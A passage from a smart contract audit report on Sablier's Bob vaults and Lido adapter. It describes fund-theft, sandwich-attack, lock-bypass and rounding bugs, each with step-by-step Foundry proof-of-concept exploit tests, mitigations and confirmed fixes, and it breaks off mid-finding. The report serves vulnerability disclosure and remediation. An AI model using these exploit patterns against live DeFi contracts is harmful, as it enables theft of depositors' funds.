**Lead Auditors**

[Dacian](https://x.com/DevDacian)

[MrPotatoMagic](https://x.com/MrPotatoMagic)

**Assisting Auditors**



---

# Findings
## Critical Risk


### Adapter vault `_userWstETH` not cleared after redemption enables theft of other users' funds

**Description:** When a user redeems shares from an adapter vault via `SablierBob::redeem`, their shares are burned but the `_userWstETH` mapping in `SablierLidoAdapter` is never cleared or decremented. This contrasts with `SablierBob::exitWithinGracePeriod` which correctly clears `_userWstETH` and decrements `_vaultTotalWstETH`.

The root cause is in `BobVaultShare::_update` (`BobVaultShare.sol:107-118`):
```solidity
if (from != address(0) && to != address(0)) {
    ISablierBob(SABLIER_BOB).onShareTransfer(VAULT_ID, from, to, amount, fromBalanceBefore);
}
```
Burns (where `to == address(0)`) do not trigger `SablierBob::onShareTransfer`, so `SablierLidoAdapter::updateStakedTokenBalance` is never called. And `SablierLidoAdapter::calculateAmountToTransferWithYield` (`SablierLidoAdapter.sol:153-193`) is a `view` function that reads `_userWstETH` but never modifies it.

In `redeem` (`SablierBob.sol:290-373`), the flow is:
1. Burn shares (line 323) — `_userWstETH` NOT cleared
2. Unstake if needed (lines 328-334)
3. Call `calculateAmountToTransferWithYield` (line 338-339) — reads stale `_userWstETH`
4. Transfer tokens (line 369)

Compare with `exitWithinGracePeriod` which calls `SablierLidoAdapter::unstakeForUserWithinGracePeriod` (`SablierLidoAdapter.sol:290-306`):
```solidity
_userWstETH[vaultId][user] = 0;           // CLEARED
_vaultTotalWstETH[vaultId] -= userWstETH; // DECREMENTED
```

**Impact:** An attacker controlling two addresses can steal WETH from other depositors in the same vault:

1. Attacker A, attacker B, and victim C each deposit 100 WETH into an adapter vault. State: `_userWstETH[A]=100`, `_userWstETH[B]=100`, `_userWstETH[C]=100`, `_vaultTotalWstETH=300`
2. Vault settles/expires. `unstakeFullAmount` converts 300 wstETH to 330 WETH (includes yield). `_wethReceivedAfterUnstaking=330`
3. A calls `redeem`: shares burned, `calculateAmountToTransferWithYield` computes `userWethShare = 100 * 330 / 300 = 110`. A receives ~110 WETH. **But `_userWstETH[A]` is still 100**
4. B transfers all shares to A via ERC20 transfer. `updateStakedTokenBalance` moves B's 100 wstETH to A. Now `_userWstETH[A] = 100 (stale) + 100 (transferred) = 200`
5. A calls `redeem` again with B's shares: `userWethShare = 200 * 330 / 300 = 220`. A receives ~220 WETH
6. Total attacker receives: ~110 + ~220 = ~330 WETH (all vault funds). Victim C's `redeem` reverts — no WETH remains

**Proof of Concept:** Add the following test to `tests/bob/integration/concrete/redeem/redeemPoC.t.sol`:

```solidity
/// When a user redeems from an adapter vault, shares are burned but _userWstETH in the
/// adapter is NEVER cleared. An attacker with two addresses can:
/// 1. Redeem from address A (wstETH tracking persists despite shares being burned)
/// 2. Transfer shares from address B to A (wstETH compounds on stale data)
/// 3. Redeem again from A with inflated wstETH ratio, draining other users' funds
function test_PoC_StaleUserWstETH_FundTheft() external {
    uint256 vaultId = createVaultWithAdapter();
    uint128 amount = WETH_DEPOSIT_AMOUNT; // 1e18

    // Three users deposit: depositor (attacker A), depositor2 (attacker B), alice (victim)
    setMsgSender(users.depositor);
    bob.enter(vaultId, amount);
    uint128 wstETH_initial = adapter.getYieldBearingTokenBalanceFor(vaultId, users.depositor);

    setMsgSender(users.depositor2);
    bob.enter(vaultId, amount);

    setMsgSender(users.alice);
    bob.enter(vaultId, amount);

    // Simulate yield: lower wstETH rate = more stETH per wstETH when unwrapping
    wsteth.setExchangeRate(0.818e18);

    // Warp past expiry and unstake
    vm.warp(EXPIRY + 1);
    bob.unstakeTokensViaAdapter(vaultId);

    uint256 totalWeth = adapter.getWethReceivedAfterUnstaking(vaultId);
    assertGt(totalWeth, 3e18, "yield should produce > 3 WETH from 3 deposits");

    // Attacker A redeems
    setMsgSender(users.depositor);
    uint256 wethBefore = IERC20(address(weth)).balanceOf(users.depositor);
    bob.redeem(vaultId);
    uint256 firstRedeem = IERC20(address(weth)).balanceOf(users.depositor) - wethBefore;

    // *** BUG: _userWstETH is NOT cleared after redeem ***
    assertEq(
        adapter.getYieldBearingTokenBalanceFor(vaultId, users.depositor),
        wstETH_initial,
        "BUG: _userWstETH unchanged after redeem (should be 0)"
    );

    // Attacker B transfers all shares to attacker A
    setMsgSender(users.depositor2);
    IERC20 shareToken = IERC20(address(bob.getShareToken(vaultId)));
    shareToken.transfer(users.depositor, shareToken.balanceOf(users.depositor2));

    // wstETH[A] = stale_amount + transferred_amount = INFLATED
    assertGt(
        adapter.getYieldBearingTokenBalanceFor(vaultId, users.depositor),
        wstETH_initial,
        "BUG: wstETH inflated from stale + transferred"
    );

    // Attacker A redeems AGAIN with inflated wstETH
    setMsgSender(users.depositor);
    wethBefore = IERC20(address(weth)).balanceOf(users.depositor);
    bob.redeem(vaultId);
    uint256 secondRedeem = IERC20(address(weth)).balanceOf(users.depositor) - wethBefore;

    // Attacker received more than their legitimate 2/3 share
    assertGt(
        firstRedeem + secondRedeem,
        (totalWeth * 2) / 3,
        "EXPLOIT: attacker received more than legitimate 2/3 share"
    );

    // Victim alice tries to redeem - REVERTS because WETH was drained
    setMsgSender(users.alice);
    assertGt(shareToken.balanceOf(users.alice), 0, "alice still has shares");
    vm.expectRevert();
    bob.redeem(vaultId);
}
```

Run with: `forge test --match-test test_PoC_StaleUserWstETH_FundTheft -vvv`

**Recommended Mitigation:** Add a state-changing function in the adapter to clear `_userWstETH` after redemption, and call it from `redeem`:

```solidity
// In SablierLidoAdapter, add:
function clearUserWstETH(uint256 vaultId, address user) external onlySablierBob {
    uint128 userWstETH = _userWstETH[vaultId][user];
    _userWstETH[vaultId][user] = 0;
    _vaultTotalWstETH[vaultId] -= userWstETH;
}

// In SablierBob::redeem, after calculateAmountToTransferWithYield:
vault.adapter.clearUserWstETH(vaultId, msg.sender);
```

Alternatively, change `calculateAmountToTransferWithYield` from a `view` function to a state-changing function that clears the user's wstETH data.

**Sablier:** Fixed in commit [e7b4f7f](https://github.com/sablier-labs/lockup/commit/e7b4f7f22fa838da70d36e7555570fc3032f9705). The old `calculateAmountToTransferWithYield` view function has been replaced with `SablierLidoAdapter::processRedemption`, which is a state-changing function called from `SablierBob::redeem` that explicitly clears the user's `wstETH`.

The redeem flow also now burns shares after `processRedemption` so the `wstETH` data is consumed before the burn.

**Cyfrin:** Verified.


\clearpage
## High Risk


### Circular slippage protection in `SablierLidoAdapter::_wstETHToWeth` enables sandwich attacks on adapter vault unstaking

**Description:** In `SablierLidoAdapter::_wstETHToWeth` (`SablierLidoAdapter.sol:367-389`), the minimum acceptable output for the Curve swap is derived from `get_dy` — a view function that returns the expected output based on the pool's **current reserves**:

```solidity
uint256 expectedEthOut = ICurveStETHPool(CURVE_POOL).get_dy(1, 0, stETHAmount);
uint256 minEthOut = ud(expectedEthOut).mul(UNIT.sub(slippageTolerance)).unwrap();
uint256 ethReceived = ICurveStETHPool(CURVE_POOL).exchange(1, 0, stETHAmount, minEthOut);
```

The Curve stETH/ETH pool's [`get_dy`](https://github.com/curvefi/curve-contract/blob/master/contracts/pools/steth/StableSwapSTETH.vy#L419-L425) reads the current pool balances via `self._balances()` to compute its output:

```vyper
@view
@external
def get_dy(i: int128, j: int128, dx: uint256) -> uint256:
    xp: uint256[N_COINS] = self._balances()   # reads CURRENT reserves
    x: uint256 = xp[i] + dx
    y: uint256 = self.get_y(i, j, x, xp)
    dy: uint256 = xp[j] - y - 1
    fee: uint256 = self.fee * dy / FEE_DENOMINATOR
    return dy - fee
```

The `exchange` function uses the same `self._balances()` pattern. Since both functions read the current reserve state and execute in the same transaction, if an attacker manipulates the pool reserves before the transaction, `get_dy` returns a value reflecting the manipulated state, and the slippage tolerance (max 5%) is applied to the already-depressed price. The protection is circular — it only guards against price movement *between* `get_dy` and `exchange` within the same atomic transaction, which is always zero. This is a [known vulnerability pattern with on-chain slippage calculation](https://dacian.me/defi-slippage-attacks#heading-on-chain-slippage-calculation-can-be-manipulated). The manipulability of Curve's `get_dy` on the same stETH/ETH pool was also [confirmed as a high-severity finding in the Tapioca DAO audit](https://code4rena.com/reports/2023-07-tapioca#h-08-lidoethstrategy_currentbalance-is-subject-to-price-manipulation-allows-overborrowing-and-liquidations) where `get_dy(1, 0, stEthBalance)` was used identically.

`SablierBob::unstakeTokensViaAdapter` (`SablierBob.sol:425-468`) is permissionless — anyone can call it once a vault is settled or expired. This means the attacker controls exactly when the unstaking occurs and can sandwich their own call:

1. **Front-run**: Flashloan a large amount of stETH, dump it into the Curve pool → pushes down the stETH/ETH exchange rate
2. **Call `unstakeTokensViaAdapter`**: `get_dy` reads the manipulated reserves and returns a depressed `expectedEthOut`. `minEthOut` = depressed price * 95% — an even lower threshold. `exchange` executes at the manipulated rate and passes the check
3. **Back-run**: Buy back stETH cheaply from the now-imbalanced pool → profit from the price recovery

The damage is amplified because `_wethReceivedAfterUnstaking` is written once during `unstakeFullAmount` (`SablierLidoAdapter.sol:322`) and used as the denominator for **all subsequent user redemptions**. A single sandwich attack permanently reduces every user's WETH payout for that vault.

The same vulnerability applies to `unstakeForUserWithinGracePeriod` (`SablierLidoAdapter.sol:290-306`), which uses the same `_wstETHToWeth` function. While this path is only callable by `SablierBob` (not directly by the attacker), the user's `exitWithinGracePeriod` transaction can still be sandwiched in the mempool.

**Impact:** An attacker can steal a portion of every adapter vault's WETH during unstaking. The attack requires no special permissions — `unstakeTokensViaAdapter` is permissionless, so the attacker controls the timing perfectly. The profit equals the difference between the fair stETH/ETH rate and the manipulated rate, minus flashloan fees and gas. For large vaults, this can be substantial.

The 5% max slippage tolerance (`MAX_SLIPPAGE_TOLERANCE = 0.05e18`) caps the per-vault loss at ~5% of total staked value, but this is applied to every adapter vault that gets unstaked. Since the attacker can monitor all vault settlements and sandwich each one, the cumulative loss across the protocol can be significant.

**Proof of Concept:** The PoC requires a small backward-compatible addition to `MockCurvePool` in `tests/bob/mocks/MockLido.sol` — a `poolManipulationBps` variable that affects both `get_dy` and `exchange`, simulating an attacker skewing the pool's reserves via flashloan. When set, both functions return depressed values (matching real Curve behavior where spot price queries and swaps read the same reserves):
```diff
@ bob/tests/bob/mocks/MockLido.sol:109 @ contract MockCurvePool is ICurveStETHPool {
    /// @dev Slippage in basis points (e.g., 100 = 1% less than expected).
    uint256 public actualSlippage;

+   /// @dev Pool manipulation in basis points — simulates an attacker skewing reserves.
+   /// Affects BOTH get_dy and exchange (the spot price the pool reports).
+   uint256 public poolManipulationBps;

    constructor(address stETH_) {
        STETH = stETH_;
    }
@ bob/tests/bob/mocks/MockLido.sol:120 @ contract MockCurvePool is ICurveStETHPool {
    function exchange(int128, int128, uint256 dx, uint256) external payable override returns (uint256) {
        IStETH(STETH).transferFrom(msg.sender, address(this), dx);

-       // Calculate actual output with slippage simulation.
-       uint256 actualOutput = (dx * (10_000 - actualSlippage)) / 10_000;
+      // Calculate actual output with pool manipulation and slippage simulation.
+       uint256 actualOutput = dx;
+       if (poolManipulationBps > 0) {
+           actualOutput = (actualOutput * (10_000 - poolManipulationBps)) / 10_000;
+       }
+       if (actualSlippage > 0) {
+           actualOutput = (actualOutput * (10_000 - actualSlippage)) / 10_000;
+       }

        (bool success,) = msg.sender.call{ value: actualOutput }("");
        require(success, "ETH transfer failed");
        return actualOutput;
    }

-   function get_dy(int128, int128, uint256 dx) external pure override returns (uint256) {
-       // Always returns the expected 1:1 rate (no slippage in the quote).
+   function get_dy(int128, int128, uint256 dx) external view override returns (uint256) {
+       // When pool is manipulated, get_dy reflects the manipulated reserves.
+       if (poolManipulationBps > 0) {
+           return (dx * (10_000 - poolManipulationBps)) / 10_000;
+       }
        return dx;
    }

@ bob/tests/bob/mocks/MockLido.sol:148 @ contract MockCurvePool is ICurveStETHPool {
        actualSlippage = slippageBps;
    }

+   /// @notice Simulates an attacker manipulating pool reserves (e.g., via flashloan).
+   /// Affects both get_dy and exchange, modeling how a real sandwich attack works.
+   /// @param bps Manipulation in basis points (e.g., 400 = 4% price depression).
+   function setPoolManipulation(uint256 bps) external {
+       poolManipulationBps = bps;
+   }

    receive() external payable { }
}
```

Add the following test to `tests/bob/integration/concrete/unstake-full-amount/unstakeFullAmountPoC.t.sol`:

```solidity
/// Demonstrates a sandwich attack on unstakeTokensViaAdapter:
/// 1. Normal path: unstake without pool manipulation → fair WETH received
/// 2. Sandwich path: attacker manipulates pool reserves before unstaking →
///    get_dy returns depressed price, minEthOut is derived from depressed price,
///    exchange executes at depressed price and PASSES the slippage check
/// 3. Compare: sandwich path yields significantly less WETH, permanently
///    reducing _wethReceivedAfterUnstaking for all users in the vault
function test_PoC_SandwichAttackOnUnstaking() external {
    // Setup: create adapter vault, three users deposit 10 WETH each
    uint256 vaultId = createVaultWithAdapter();
    uint128 depositAmount = 10e18;

    setMsgSender(users.depositor);
    bob.enter(vaultId, depositAmount);

    setMsgSender(users.depositor2);
    bob.enter(vaultId, depositAmount);

    setMsgSender(users.alice);
    bob.enter(vaultId, depositAmount);

    // Total deposited: 30 WETH. Warp past expiry
    vm.warp(EXPIRY + 1);

    // ====== SNAPSHOT ======
    uint256 snapshotId = vm.snapshot();

    // ====== NORMAL PATH: unstake without manipulation ======
    bob.unstakeTokensViaAdapter(vaultId);
    uint256 normalWethReceived = adapter.getWethReceivedAfterUnstaking(vaultId);

    // ====== REVERT TO SNAPSHOT ======
    vm.revertTo(snapshotId);

    // ====== SANDWICH PATH: attacker manipulates pool before unstaking ======
    // Simulate attacker front-running: dumps stETH into Curve pool,
    // depressing the stETH/ETH rate by 4%.
    // Both get_dy and exchange now reflect the manipulated reserves.
    curvePool.setPoolManipulation(400); // 4% price depression

    // Attacker calls unstakeTokensViaAdapter (it's permissionless!)
    // Inside _wstETHToWeth:
    //   get_dy returns depressed value (manipulated reserves)
    //   minEthOut = depressed value * (1 - 0.5% tolerance) — even lower
    //   exchange executes at depressed rate — passes the check!
    bob.unstakeTokensViaAdapter(vaultId);
    uint256 sandwichWethReceived = adapter.getWethReceivedAfterUnstaking(vaultId);

    // Attacker back-runs: removes stETH from pool, profits from recovery
    curvePool.setPoolManipulation(0);

    // ====== VERIFY: sandwich reduced WETH received ======
    uint256 wethStolen = normalWethReceived - sandwichWethReceived;

    // The sandwich depressed the received WETH by ~4%
    assertGt(wethStolen, 0, "Sandwich should reduce WETH received");
    assertGt(
        wethStolen,
        (normalWethReceived * 3) / 100, // at least 3% loss
        "Loss should be significant (>3% of normal amount)"
    );

    // ====== VERIFY: slippage check did NOT protect users ======
    // The fact that unstakeTokensViaAdapter succeeded (didn't revert)
    // proves the circular slippage check passed despite 4% manipulation.
    assertGt(sandwichWethReceived, 0, "Unstaking succeeded despite manipulation");

    // ====== VERIFY: all users' redemptions are permanently affected ======
    setMsgSender(users.depositor);
    (uint128 depositorRedeem,) = bob.redeem(vaultId);

    // User should have received ~10 WETH worth (their 1/3 share),
    // but instead receives ~4% less due to the sandwich
    uint256 expectedFairShare = normalWethReceived / 3;
    uint256 actualShare = uint256(depositorRedeem);

    assertLt(actualShare, expectedFairShare, "User received less than fair share");
    uint256 userLoss = expectedFairShare - actualShare;
    assertGt(
        userLoss,
        (expectedFairShare * 3) / 100, // at least 3% loss per user
        "Per-user loss should be significant (>3%)"
    );
}
```

Run with: `forge test --match-test test_PoC_SandwichAttackOnUnstaking -vvv`

**Recommended Mitigation:** Replace the circular spot-price slippage protection with an external price reference. Options include:

1. **Use Chainlink stETH/ETH oracle for `minEthOut`**: The protocol already integrates Chainlink oracles — use a stETH/ETH feed (or derive the rate from stETH/USD and ETH/USD feeds) as the price reference instead of the manipulable Curve spot price:

```solidity
function _wstETHToWeth(uint128 wstETHAmount) private returns (uint128 wethReceived) {
    uint256 stETHAmount = IWstETH(WSTETH).unwrap(wstETHAmount);

    // Use oracle price instead of spot price for minEthOut
    uint256 oraclePrice = _getStETHToETHOraclePrice();
    uint256 fairEthOut = stETHAmount * oraclePrice / 1e18;
    uint256 minEthOut = ud(fairEthOut).mul(UNIT.sub(slippageTolerance)).unwrap();

    uint256 ethReceived = ICurveStETHPool(CURVE_POOL).exchange(1, 0, stETHAmount, minEthOut);
    // ...
}
```

2. **Allow caller to specify `minEthOut`**: Let the caller provide the minimum acceptable output computed off-chain, so they can use fair market data:

```solidity
function unstakeTokensViaAdapter(uint256 vaultId, uint256 minEthOut) external;
```

3. **Use Lido's native withdrawal queue**: Lido withdrawals process at the protocol-determined exchange rate (not a DEX spot price), eliminating the manipulation surface entirely.

**Sablier:** Fixed in commits:
* [2e0abaf](https://github.com/sablier-labs/lockup/commit/2e0abaf7b026126895443b416bd4bf3e7d6c9bea) - the Curve `get_dy` spot price reference has been replaced with a Chainlink oracle; `SablierLidoAdapter::_swapWstETHToWeth` now uses `STETH_ETH_ORACLE`
* [7fae842](https://github.com/sablier-labs/lockup/commit/7fae8429bdb2b88d4b0e63dcf25eb8a1477e5a8a) - after mitigation review, a check has been added to revert if the oracle price is zero, to avoid zero slippage swaps if the oracle is misbehaving. No other oracle-related checks were added to provide a balance between protecting the user but also allowing them to exit; we don't want their tokens to be locked forever simply because the oracle has problems.

**Cyfrin:** Verified; we note that the curve swap can execute with stale prices. This appears to be a design decision which:
* allows users to exit even if the Oracle is not behaving 100% correctly
* only reverts in the case that an unlimited slippage swap (oracle price is zero)

\clearpage
## Medium Risk


### Users can bypass vault lock and withdraw at any time

**Description:** A user can bypass the vault lock to withdraw at any time by:
- Transferring their `BobVaultShare` to a different address
- Calling `SablierBob::enter` from the new address with a small amount of additional tokens
- Calling `SablierBob::exitWithinGracePeriod` from the new address to withdraw the total balance including the originally locked deposit

This works because `exitWithinGracePeriod` (`SablierBob.sol:237-287`) only checks that the caller has a `_firstDepositTimes` entry and is within the grace period. It burns the caller's entire share balance (line 248), not just the amount they deposited:

```solidity
uint128 amount = vault.shareToken.balanceOf(msg.sender).toUint128();
```

When the new address calls `enter` with even 1 wei, it gets a fresh `_firstDepositTimes` entry (line 213-215). Combined with the transferred shares, `exitWithinGracePeriod` then burns and returns everything.

**Impact:** The vault's purpose is to lock tokens until a price target is reached or the expiry passes. This bypass completely defeats the lock mechanism — any user can withdraw at any time while the vault is still ACTIVE, at the cost of 1 additional token. This undermines the core value proposition of the protocol.

**Proof of Concept:** Add the following test to `tests/bob/integration/concrete/exit-within-grace-period/exitWithinGracePeriodPoC.t.sol`:

```solidity
/// A user can bypass the vault lock by:
/// 1. Transferring BobVaultShare to a different address
/// 2. Calling enter from the new address with a small amount
/// 3. Calling exitWithinGracePeriod to withdraw everything including the locked deposit
function test_PoC_BypassVaultLock() external {
    uint256 vaultId = createDefaultVault();
    uint128 depositAmount = DEPOSIT_AMOUNT; // 10_000e18

    // User A deposits into the vault
    setMsgSender(users.depositor);
    bob.enter(vaultId, depositAmount);
    IERC20 shareToken = IERC20(address(bob.getShareToken(vaultId)));
    assertEq(shareToken.balanceOf(users.depositor), depositAmount, "A has shares");

    // Grace period expires - user A should be locked in
    vm.warp(block.timestamp + 4 hours + 1);

    // Verify A can no longer exit via grace period
    uint40 depositedAt = bob.getFirstDepositTime(vaultId, users.depositor);
    uint40 gracePeriodEnd = depositedAt + 4 hours;
    vm.expectRevert(
        abi.encodeWithSelector(
            Errors.SablierBob_GracePeriodExpired.selector, vaultId, users.depositor, depositedAt, gracePeriodEnd
        )
    );
    bob.exitWithinGracePeriod(vaultId);

    // A transfers all shares to address B (same person, different address)
    shareToken.transfer(users.depositor2, depositAmount);
    assertEq(shareToken.balanceOf(users.depositor), 0, "A transferred all shares");
    assertEq(shareToken.balanceOf(users.depositor2), depositAmount, "B received shares");

    // B deposits 1 wei to get a fresh _firstDepositTimes entry
    setMsgSender(users.depositor2);
    bob.enter(vaultId, 1);

    // B now has all shares + 1 and a fresh grace period
    assertEq(shareToken.balanceOf(users.depositor2), depositAmount + 1, "B has all shares + 1");

    // B exits within grace period - withdraws EVERYTHING including A's locked deposit
    uint256 tokenBalanceBefore = dai.balanceOf(users.depositor2);
    bob.exitWithinGracePeriod(vaultId);
    uint256 tokensReceived = dai.balanceOf(users.depositor2) - tokenBalanceBefore;

    // B received the full amount: the originally locked deposit + 1 wei
    assertEq(tokensReceived, depositAmount + 1, "EXPLOIT: withdrew all tokens including locked deposit");
    assertEq(shareToken.balanceOf(users.depositor2), 0, "B has no shares left");
}
```

Run with: `forge test --match-test test_PoC_BypassVaultLock -vvv`

**Recommended Mitigation:** Track the original deposit amount per user and only allow exiting with up to that amount during the grace period:
```solidity
mapping(uint256 vaultId => mapping(address user => uint128 depositedAmount)) internal _userDeposits;
```

In `exitWithinGracePeriod`, use `min(shareBalance, _userDeposits[vaultId][msg.sender])` instead of the full share balance.

**Sablier:** Fixed in commit [74fa619](https://github.com/sablier-labs/lockup/commit/74fa619471e00958b6b922f8b6c4d9bb95ccc37a) by removing the early exit grace period functionality.

**Cyfrin:** Verified.


### Floor division in `SablierLidoAdapter::updateStakedTokenBalance` allows transferring `BobVaultShares` without moving wstETH backing

**Description:** In `SablierLidoAdapter::updateStakedTokenBalance` (`SablierLidoAdapter.sol:352`), the wstETH to transfer is computed using floor division:

```solidity
uint128 wstETHToTransfer = (fromWstETH * shareAmountTransferred / userShareBalanceBeforeTransfer).toUint128();
```

When `fromWstETH * shareAmountTransferred < userShareBalanceBeforeTransfer`, floor division truncates `wstETHToTransfer` to 0. This is easily triggered because the wstETH exchange rate is less than 1:1 with shares — a deposit of N WETH mints N shares but produces less than N wstETH (e.g., with a 0.9 exchange rate, 1000 shares correspond to 900 wstETH). As a result, any 1-wei share transfer satisfies the rounding-to-zero condition: `900 * 1 / 1000 = 0`.

By transferring `BobVaultShares` in 1-wei increments instead of a single bulk transfer, a sender can move an arbitrary number of shares to a recipient while retaining all of their wstETH backing. The recipient ends up holding worthless shares with zero wstETH attribution. Since `SablierLidoAdapter::calculateAmountToTransferWithYield` computes WETH payouts based on `_userWstETH` (not share balances), the recipient receives zero WETH when they redeem.

**Impact:** Any user who receives `BobVaultShare` tokens via small incremental transfers (e.g., buying shares OTC, receiving from a vault share marketplace, or receiving via any transfer mechanism that uses small amounts) will have shares with no wstETH backing. When they redeem after vault settlement/expiry, they receive zero WETH despite holding valid shares.

The sender retains all wstETH backing and receives a disproportionately large WETH payout on redemption. This creates a direct loss for share recipients and a corresponding gain for senders who exploit the rounding.

**Proof of Concept:** Add the following test to `tests/bob/integration/concrete/adapter/adapterPoC.t.sol`:

```solidity
/// - Normal path: A transfers 99 shares to B in one transfer, both redeem
///   and receive proportional WETH
/// - Exploit path: A transfers 99 shares to B in 1-wei increments, both redeem
///   but B receives ZERO WETH while A receives almost everything
///
/// Uses a 1000-wei deposit. With exchange rate 0.9, wstETH = 900.
/// Transferring 99 shares (1000→901) keeps shares > wstETH throughout,
/// so every 1-wei transfer rounds wstETHToTransfer to 0.
function test_PoC_SmallTransfersMakeSharesWorthless() external {
    // Setup: create adapter vault, user A deposits 1000 wei
    uint256 vaultId = createVaultWithAdapter();
    uint128 depositAmount = 1000;

    setMsgSender(users.depositor); // User A
    bob.enter(vaultId, depositAmount);

    uint128 wstETHInitial = adapter.getYieldBearingTokenBalanceFor(vaultId, users.depositor);
    assertGt(wstETHInitial, 0, "A should have wstETH after deposit");

    // Expire vault and unstake all tokens to WETH
    vm.warp(EXPIRY + 1);
    bob.unstakeTokensViaAdapter(vaultId);

    uint256 totalWeth = adapter.getWethReceivedAfterUnstaking(vaultId);
    assertGt(totalWeth, 0, "vault should have WETH after unstaking");

    IERC20 shareToken = IERC20(address(bob.getShareToken(vaultId)));
    uint128 transferAmount = 99; // A keeps 901 shares so both can redeem

    // ====== SNAPSHOT ======
    uint256 snapshotId = vm.snapshot();

    // ====== NORMAL PATH: A transfers 99 shares to B in one transfer ======
    setMsgSender(users.depositor);
    shareToken.transfer(users.depositor2, transferAmount);

    // Both redeem
    setMsgSender(users.depositor);
    (uint128 normalRedeemA,) = bob.redeem(vaultId);

    setMsgSender(users.depositor2);
    (uint128 normalRedeemB,) = bob.redeem(vaultId);

    // ====== REVERT TO SNAPSHOT ======
    vm.revertTo(snapshotId);

    // ====== EXPLOIT PATH: A transfers 99 shares to B in 1-wei increments ======
    setMsgSender(users.depositor);
    for (uint256 i; i < transferAmount; i++) {
        shareToken.transfer(users.depositor2, 1);
    }

    // Verify state: B has 99 shares but ZERO wstETH; A has 901 shares and ALL wstETH
    assertEq(
        shareToken.balanceOf(users.depositor),
        depositAmount - transferAmount,
        "A has 901 shares"
    );
    assertEq(shareToken.balanceOf(users.depositor2), transferAmount, "B has 99 shares");
    assertEq(
        adapter.getYieldBearingTokenBalanceFor(vaultId, users.depositor2),
        0,
        "BUG: B has 0 wstETH despite holding 99 shares"
    );
    assertEq(
        adapter.getYieldBearingTokenBalanceFor(vaultId, users.depositor),
        wstETHInitial,
        "BUG: A retained all wstETH despite transferring 99 shares"
    );

    // Both redeem
    setMsgSender(users.depositor);
    (uint128 exploitRedeemA,) = bob.redeem(vaultId);

    setMsgSender(users.depositor2);
    (uint128 exploitRedeemB,) = bob.redeem(vaultId);

    // ====== COMPARE RESULTS ======
    // Normal path: B gets proportional WETH
    assertGt(normalRedeemB, 0, "Normal: B received WETH");

    // Exploit path: B gets ZERO despite holding shares
    assertEq(exploitRedeemB, 0, "Exploit: B received ZERO WETH despite holding 99 shares");

    // Exploit path: A gets nearly all WETH
    assertGt(exploitRedeemA, normalRedeemA, "Exploit: A received MORE than in normal path");
}
```

Run with: `forge test --match-test test_PoC_SmallTransfersMakeSharesWorthless -vvv`

**Recommended Mitigation:** A simple mitigation is to revert in `SablierLidoAdapter::updateStakedTokenBalance` if `wstETHToTransfer == 0`.

**Sablier:** Fixed in commit [3c669df](https://github.com/sablier-labs/lockup/commit/3c669df3ffd53828fe3b6ec6284316f76bdabb70).

**Cyfrin:** Verified.


### Immutable Curve pool dependency creates long-term redemption risk for adapter vaults

**Description:** `SablierLidoAdapter` uses an immutable `CURVE_POOL` address (`SablierLidoAdapter.sol:36`) as the **sole exit path** from stETH back to ETH during unstaking. The entire redemption flow for adapter vaults depends on this single Curve pool:

```solidity
// SablierLidoAdapter.sol:367-389 — the ONLY path from wstETH to WETH
function _wstETHToWeth(uint128 wstETHAmount) private returns (uint128 wethReceived) {
    uint256 stETHAmount = IWstETH(WSTETH).unwrap(wstETHAmount);
    uint256 expectedEthOut = ICurveStETHPool(CURVE_POOL).get_dy(1, 0, stETHAmount);
    uint256 minEthOut = ud(expectedEthOut).mul(UNIT.sub(slippageTolerance)).unwrap();
    uint256 ethReceived = ICurveStETHPool(CURVE_POOL).exchange(1, 0, stETHAmount, minEthOut);
    // ...
}
```

Bob vaults are designed to lock tokens for potentially long durations — years or even decades. During this time:

- `CURVE_POOL` is immutable; there is no setter or migration function
- There is no fallback exit path (e.g., Lido's native withdrawal queue)
- There is no admin rescue function to recover stuck wstETH
- There is no alternative DEX or liquidity source

If the specific Curve stETH/ETH pool referenced by `CURVE_POOL` loses liquidity, is deprecated, migrates to a new version, or becomes non-functional at any point during a vault's lifetime, all adapter vault redemptions permanently revert. The wstETH remains locked in the adapter with no recovery mechanism.

Notably, Lido introduced a native withdrawal queue (mid-2023) that provides a guaranteed 1:1 stETH→ETH exit without any DEX liquidity dependency. The adapter does not use this as either a primary or fallback path.

**Impact:** All adapter vaults become permanently unredeemable if the immutable Curve pool becomes unusable. The staked WETH (plus accumulated yield) is locked forever. This affects every user who entered an adapter vault, with no admin intervention possible.

The likelihood is low since the Curve stETH/ETH pool is one of the most established DeFi pools, but the 10-20 year vault horizons exceed the entire lifespan of DeFi to date. Any of the following could trigger the issue: Curve v1 deprecation, pool migration to Curve v2/v3, governance-mandated pool shutdown, or sustained liquidity drain.

**Recommended Mitigation:** Add Lido's native withdrawal queue as a fallback (or primary) unstaking path. This provides a guaranteed 1:1 exit that doesn't depend on any DEX liquidity:

```solidity
// Add as a fallback when Curve swap fails or as the primary path
ILidoWithdrawalQueue(WITHDRAWAL_QUEUE).requestWithdrawals(amounts, address(this));
// ... wait for finalization ...
ILidoWithdrawalQueue(WITHDRAWAL_QUEUE).claimWithdrawals(requestIds, hints);
```

Alternatively, make the Curve pool address updatable by the comptroller so it can be migrated to a new pool if the original is deprecated:

```solidity
function setCurvePool(address newPool) external onlyComptroller {
    curvePool = newPool;
    IStETH(STETH).approve(newPool, type(uint256).max);
}
```

**Sablier:** Fixed in commits:
* [f9c14e2](https://github.com/sablier-labs/lockup/commit/f9c14e2f6d4ba6a9d4309cb45408ba20e6a0d393) - integrating Lido native withdrawal
* [6ddfaac](https://github.com/sablier-labs/lockup/commit/6ddfaacf0f243fe3f15efa564c58719fa8a71d5e) - implement mitigation feedback to prevent vault unstaked via Curve from also being used to initiate Lido withdrawals

**Cyfrin:** Verified; there are now two exclusive options for redemption: Curve & Lido Withdrawals. For a given vault:
* if no Lido withdrawal has been initiated, any user can initiate a Curve redemption which prevents subsequent Lido withdrawals for the same vault
* if no Curve redemption has been initiated, the `Comptroller` can initiate a Lido Withdrawal which prevents Curve redemptions for the same vault


### Custom `comptroller` fees are ignored in `SablierBob::redeem`

**Description:** `SablierComptroller::setCustomFeeUSDFor` allows `FEE_MANAGEMENT_ROLE` to set custom fees for a particular protocol (in this case the Bob protocol) and the user:
```solidity
function setCustomFeeUSDFor(
        Protocol protocol,
        address user,
        uint256 customFeeUSD
    )
        external
        override
        onlyRole(FEE_MANAGEMENT_ROLE)
        notExceedMaxFeeUSD(customFeeUSD)
    {
        ... ... ...

        // Effect: enable the custom fee, if it is not already enabled.
        if (!_protocolFees[protocol].customFeesUSD[user].enabled) {
            _protocolFees[protocol].customFeesUSD[user].enabled = true;
        }

        // Effect: update the custom fee for the provided protocol and user.
        _protocolFees[protocol].customFeesUSD[user].fee = customFeeUSD;

        ... ...  ...
```

